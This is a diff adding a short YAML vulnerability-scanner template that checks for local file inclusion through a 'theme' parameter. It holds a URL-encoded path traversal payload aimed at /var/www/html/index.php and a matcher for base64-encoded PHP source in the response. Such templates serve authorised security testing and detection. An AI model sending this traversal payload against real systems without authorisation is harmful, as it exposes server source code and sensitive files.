@@ -1,0 +1,20 @@
+id: lfi3-189
+name: 'Traversal to system file via theme'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via theme'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      theme:
+        - '..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
